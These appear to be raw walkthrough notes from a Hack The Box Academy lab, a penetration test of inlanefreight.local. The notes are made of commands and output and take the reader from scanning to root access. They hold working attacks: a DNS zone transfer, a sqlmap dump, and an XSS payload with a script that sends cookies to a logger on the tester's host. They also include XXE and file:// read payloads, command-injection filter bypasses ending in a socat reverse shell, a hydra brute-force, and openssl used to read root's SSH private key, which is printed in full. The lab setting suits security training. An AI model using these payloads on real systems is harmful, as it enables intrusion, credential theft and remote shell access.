# AEN Blind

sudo nmap -sCV 10.129.229.147
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-06 21:05 EDT
Nmap scan report for 10.129.229.147
Host is up (0.23s latency).
Not shown: 989 closed tcp ports (reset)
Bug in rpcinfo: no string output.
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|*-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|End of status
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| dns-nsid:
|  bind.version: 1337_HTB_DNS
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|*    1337_HTB_DNS
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE TOP STLS SASL RESP-CODES UIDL PIPELINING CAPA
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities IMAP4rev1 more have ENABLE LITERAL+ SASL-IR STARTTLS post-login ID listed IDLE Pre-login LOGINDISABLEDA0001 OK LOGIN-REFERRALS
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities IMAP4rev1 more ENABLE LITERAL+ SASL-IR have post-login OK listed IDLE Pre-login ID AUTH=PLAINA0001 LOGIN-REFERRALS
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE TOP CAPA SASL(PLAIN) RESP-CODES UIDL PIPELINING USER
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Support Center
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :
SF-Port53-TCP:V=7.95%I=7%D=6/6%Time=6A24C3F2%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,39,"\x007\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\r\x0c1337_HTB_DNS");
Service Info: Host:  ubuntu; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1

# The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-exkgapzjjn [htb-exkgapzjjn.htb-cloud.com](http://htb-exkgapzjjn.htb-cloud.com/)
10.129.229.147 inlanefreight.local

dig axfr inlanefreight.local @10.129.229.147

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.	86400	IN	NS	inlanefreight.local.
inlanefreight.local.	86400	IN	A	127.0.0.1
blog.inlanefreight.local. 86400	IN	A	127.0.0.1
careers.inlanefreight.local. 86400 IN	A	127.0.0.1
dev.inlanefreight.local. 86400	IN	A	127.0.0.1
flag.inlanefreight.local. 86400	IN	TXT	"HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN	A	127.0.0.1
ir.inlanefreight.local.	86400	IN	A	127.0.0.1
status.inlanefreight.local. 86400 IN	A	127.0.0.1
support.inlanefreight.local. 86400 IN	A	127.0.0.1
tracking.inlanefreight.local. 86400 IN	A	127.0.0.1
vpn.inlanefreight.local. 86400	IN	A	127.0.0.1
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 6 msec
;; SERVER: 10.129.229.147#53(10.129.229.147) (TCP)
;; WHEN: Sat Jun 06 21:10:46 EDT 2026
;; XFR size: 14 records (messages 1, bytes 448)

ftp anonymous@inlanefreight.local
Connected to inlanefreight.local.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44771|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||45983|)
150 Opening BINARY mode data connection for flag.txt (38 bytes).
100% |***********************************|    38       40.33 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (4.93 KiB/s)
ftp> exit
221 Goodbye.
┌─[us-academy-6]─[10.10.15.26]─[htb-ac-323227@htb-exkgapzjjn]─[~]
└──╼ [★]$ cat flag.txt
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}

![image.png](AEN%20Blind/image.png)

![image.png](AEN%20Blind/image%201.png)

![image.png](AEN%20Blind/image%202.png)

sqlmap -r req --batch --level 5 --risk 3 --dump --dbs

+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+

cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1

# The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-exkgapzjjn [htb-exkgapzjjn.htb-cloud.com](http://htb-exkgapzjjn.htb-cloud.com/)
10.129.229.147 inlanefreight.local monitoring.inlanefreight.local ir.inlanefreight.local support.inlanefreight.local vpn.inlanefreight.local dev.inlanefreight.local status.inlanefreight.local careers.inlanefreight.local blog.inlanefreight.local tracking.inlanefreight.local flag.inlanefreight.local gitlab.inlanefreight.local

![image.png](AEN%20Blind/image%203.png)

![image.png](AEN%20Blind/image%204.png)

wpscan --url [http://ir.inlanefreight.local](http://ir.inlanefreight.local/)

![image.png](AEN%20Blind/image%205.png)

![image.png](AEN%20Blind/image%206.png)

![image.png](AEN%20Blind/image%207.png)

<b>test</b>
This payload produced the result in the screenshot - SSRF vulnerability

<img src="[http://10.10.15.26:8000/xxe.dtd](http://10.10.15.26:8000/xxe.dtd)"/> payload did fetch the file on my server

python -m http.server
Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) ...
10.129.21.66 - - [07/Jun/2026 22:40:52] "GET /xxe.dtd HTTP/1.1" 200 -

![image.png](AEN%20Blind/image%208.png)

<iframe src="file:///etc/passwd"></iframe>

<iframe src="file:///flag.txt"></iframe>

![image.png](AEN%20Blind/image%209.png)

![image.png](AEN%20Blind/image%2010.png)

![image.png](AEN%20Blind/image%2011.png)

intercepted the request for .htaccess file and changed content-type to image/png

![image.png](AEN%20Blind/image%2012.png)

![image.png](AEN%20Blind/image%2013.png)

![image.png](AEN%20Blind/image%2014.png)

![image.png](AEN%20Blind/image%2015.png)

nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.15.26] from (UNKNOWN) [10.129.23.46] 58222
GET /TESTING_THIS HTTP/1.1
Host: 10.10.15.26:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: [http://127.0.0.1/](http://127.0.0.1/)

sudo php -S 0.0.0.0:8000
[sudo] password for oscpmaster:
[Tue Jun  9 13:23:49 2026] PHP 8.4.11 Development Server ([http://0.0.0.0:8000](http://0.0.0.0:8000/)) started
[Tue Jun  9 13:33:11 2026] 10.129.23.93:35096 Accepted
[Tue Jun  9 13:33:11 2026] 10.129.23.93:35096 [200]: GET /script.js

[Tue Jun  9 13:33:11 2026] 10.129.23.93:35096 Closing
[Tue Jun  9 13:33:11 2026] 10.129.23.93:35098 Accepted
[Tue Jun  9 13:33:11 2026] 10.129.23.93:35098 [404]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99 - No such file or directory

[Tue Jun  9 13:33:11 2026] 10.129.23.93:35098 Closing
[Tue Jun  9 13:33:12 2026] 10.129.23.93:35122 Accepted
[Tue Jun  9 13:33:12 2026] 10.129.23.93:35122 [200]: GET /script.js

[Tue Jun  9 13:33:12 2026] 10.129.23.93:35122 Closing
[Tue Jun  9 13:33:12 2026] 10.129.23.93:35124 Accepted
[Tue Jun  9 13:33:12 2026] 10.129.23.93:35124 [404]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99 - No such file or directory

[Tue Jun  9 13:33:12 2026] 10.129.23.93:35124 Closing
^C

cat index.php

<?php
if (isset($_GET['c'])) {
$list = explode(";", $_GET['c']);
foreach ($list as $key => $value) {
$cookie = urldecode($value);
$file = fopen("cookies.txt", "a+");
fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
fclose($file);
}
}
?>

┌──(oscpmaster㉿oscpmaster)-[~]
└─$ cat script.js
new Image().src='[http://10.10.15.26:8000/index.php?c='+document.cookie](http://10.10.15.26:8000/index.php?c=%27+document.cookie)

payload used for xss Message "><script src=http://10.10.15.26:8000/script.js></script>

cat cookies.txt

Victim IP: 10.129.23.93 | Cookie: session=fcfaf93ab169bc943b92109f0a845d99
Victim IP: 10.129.23.93 | Cookie: session=fcfaf93ab169bc943b92109f0a845d99

used cookie editor name: session value: fcfaf93ab169bc943b92109f0a845d99

![image.png](AEN%20Blind/image%2016.png)

curl [http://monitoring.inlanefreight.local/ping.php?ip=localhost](http://monitoring.inlanefreight.local/ping.php?ip=localhost)
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.144 ms

- -- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.144/0.144/0.144/0.000 ms

curl '[http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1
	${LS_COLORS:10:1}
{ls,-la}](http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a%09$%7BLS_COLORS:10:1%7D%0a%7Bls,-la%7D)'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.049 ms

- -- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.049/0.049/0.049/0.000 ms
00112233_flag.txt
css
img
index.php
js
login.php
ping.php

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.057 ms

- -- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.057/0.057/0.057/0.000 ms

curl '[http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1
	${LS_COLORS:10:1}
cat](http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a%09$%7BLS_COLORS:10:1%7D%0acat)<00112233_flag.txt'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms

- -- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.050/0.050/0.050/0.000 ms
HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}

shopdev2.inlanefreight.local

signed in with admin admin 

![image.png](AEN%20Blind/image%2017.png)

![image.png](AEN%20Blind/image%2018.png)

![image.png](AEN%20Blind/image%2019.png)

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY company SYSTEM "file:///flag.txt">
]>
<root>
<subtotal></subtotal><userid>&company;</userid></root>

hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2026-06-09 19:41:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2026-06-09 19:41:42

![image.png](AEN%20Blind/image%2020.png)

![image.png](AEN%20Blind/image%2021.png)

![image.png](AEN%20Blind/image%2022.png)

GET /ping.php?ip=127.0.0.1%0asocat${IFS}TCP:10.10.15.26:4444${IFS}EXEC:${PATH:0:1}bin${PATH:0:1}sh HTTP/1.1

nc -lvnp 4444

id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
webdev@dmz01:/var/www/html/monitoring$

webdev@dmz01:/home/webdev$ wget 10.10.15.26:8000/linpeas.sh
wget 10.10.15.26:8000/linpeas.sh
--2026-06-10 01:19:34--  [http://10.10.15.26:8000/linpeas.sh](http://10.10.15.26:8000/linpeas.sh)
Connecting to 10.10.15.26:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [text/x-sh]
Saving to: ‘[linpeas.sh](http://linpeas.sh/)’

[linpeas.sh](http://linpeas.sh/)          100%[===================>]   1.01M  1.67MB/s    in 0.6s

2026-06-10 01:19:35 (1.67 MB/s) - ‘[linpeas.sh](http://linpeas.sh/)’ saved [1063041/1063041]

webdev@dmz01:/home/webdev$ chmod +x [linpeas.sh](http://linpeas.sh/)
chmod +x [linpeas.sh](http://linpeas.sh/)
webdev@dmz01:/home/webdev$ stty raw -echo
stty raw -echo
webdev@dmz01:/home/webdev$ ./linp

interesting linpeas output

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs (T1083)
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>

ssh srvadm@inlanefreight.localid

$ id
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ ls
flag.txt
$ cat flag.txt
b447c27a00e3a348881b0030177000cd

$ sudo -l
Matching Defaults entries for srvadm on dmz01:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
(ALL) NOPASSWD: /usr/bin/openssl

$ sudo openssl enc -in /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----

└──╼ [★]$ vi rootkey
┌─[us-academy-6]─[10.10.15.26]─[htb-ac-323227@pwnbox7]─[~]
└──╼ [★]$ chmod 400 rootkey
┌─[us-academy-6]─[10.10.15.26]─[htb-ac-323227@pwnbox7]─[~]
└──╼ [★]$ ssh -i rootkey root@inlanefreight.local

root@dmz01:~# id
uid=0(root) gid=0(root) groups=0(root)
root@dmz01:~# cat flag.txt
a34985b5976072c3c148abc751671302

ifconfig
br-65c448355ed2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
inet6 fe80::42:c5ff:fe0e:82c  prefixlen 64  scopeid 0x20<link>
ether 02:42:c5:0e:08:2c  txqueuelen 0  (Ethernet)
RX packets 446504  bytes 241052228 (241.0 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 846367  bytes 182567596 (182.5 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
inet6 fe80::42:39ff:fe90:786c  prefixlen 64  scopeid 0x20<link>
ether 02:42:39:90:78:6c  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 3  bytes 330 (330.0 B)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 10.129.229.147  netmask 255.255.0.0  broadcast 10.129.255.255
inet6 dead:beef::a0de:adff:fe43:84aa  prefixlen 64  scopeid 0x0<global>
inet6 fe80::a0de:adff:fe43:84aa  prefixlen 64  scopeid 0x20<link>
ether a2:de:ad:43:84:aa  txqueuelen 1000  (Ethernet)
RX packets 480287  bytes 80487584 (80.4 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 460663  bytes 243053240 (243.0 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
inet6 fe80::a0de:adff:fe7c:47e9  prefixlen 64  scopeid 0x20<link>
ether a2:de:ad:7c:47:e9  txqueuelen 1000  (Ethernet)
RX packets 2855  bytes 186754 (186.7 KB)
RX errors 0  dropped 33  overruns 0  frame 0
TX packets 110  bytes 9656 (9.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
inet 127.0.0.1  netmask 255.0.0.0
inet6 ::1  prefixlen 128  scopeid 0x10<host>
loop  txqueuelen 1000  (Local Loopback)
RX packets 1310294  bytes 413118153 (413.1 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 1310294  bytes 413118153 (413.1 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth8887675: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::e04d:18ff:feda:f31e  prefixlen 64  scopeid 0x20<link>
ether e2:4d:18:da:f3:1e  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth1530a5e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::b41f:ffff:fe11:f213  prefixlen 64  scopeid 0x20<link>
ether b6:1f:ff:11:f2:13  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 24  bytes 1712 (1.7 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth357b675: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::a0dc:1dff:fe8a:c79c  prefixlen 64  scopeid 0x20<link>
ether a2:dc:1d:8a:c7:9c  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth4fcd983: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::2833:abff:fe94:48a1  prefixlen 64  scopeid 0x20<link>
ether 2a:33:ab:94:48:a1  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 24  bytes 1712 (1.7 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth6bdd710: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::50c7:4aff:fea6:ee91  prefixlen 64  scopeid 0x20<link>
ether 52:c7:4a:a6:ee:91  txqueuelen 0  (Ethernet)
RX packets 2992  bytes 7128876 (7.1 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 3221  bytes 711020 (711.0 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth72b9b46: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::fcd9:ddff:fef4:275f  prefixlen 64  scopeid 0x20<link>
ether fe:d9:dd:f4:27:5f  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth97d574d: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::d4ab:c8ff:fee0:3289  prefixlen 64  scopeid 0x20<link>
ether d6:ab:c8:e0:32:89  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethc1c004e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::1cee:eaff:fe49:e609  prefixlen 64  scopeid 0x20<link>
ether 1e:ee:ea:49:e6:09  txqueuelen 0  (Ethernet)
RX packets 443512  bytes 240174408 (240.1 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 843177  bytes 181858514 (181.8 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethcbea75b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::fc94:11ff:fe12:48ae  prefixlen 64  scopeid 0x20<link>
ether fe:94:11:12:48:ae  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethd641426: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::e01a:8aff:fecc:14c2  prefixlen 64  scopeid 0x20<link>
ether e2:1a:8a:cc:14:c2  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 24  bytes 1752 (1.7 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethdcfbfed: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::748d:4bff:fe32:aa1b  prefixlen 64  scopeid 0x20<link>
ether 76:8d:4b:32:aa:1b  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 23  bytes 1642 (1.6 KB)
